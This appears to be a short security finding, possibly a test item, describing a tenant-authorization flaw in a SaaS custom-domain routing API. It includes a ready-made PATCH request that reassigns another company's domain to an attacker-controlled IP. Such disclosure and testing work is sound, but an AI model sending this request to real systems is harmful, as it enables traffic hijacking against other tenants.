diagnosis: The custom domain routing handler validates domain syntax and IPv4 formatting via Zod, but relies on tenantId provided in the request body without checking if the caller belongs to that tenant. An attacker can hijack ingress routing and redirect traffic for another company's tenant domain to an attacker-controlled server.
exploit_request:
PATCH /api/saas/tenant/domains HTTP/1.1
Host: router.edge.internal:7005
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{
  "tenantId": "7a9b1c2d-3e4f-5a6b-7c8d-9e0f1a2b3c4d",
  "customDomain": "app.victimcorp.com",
  "routingTarget": "198.51.100.25"
}
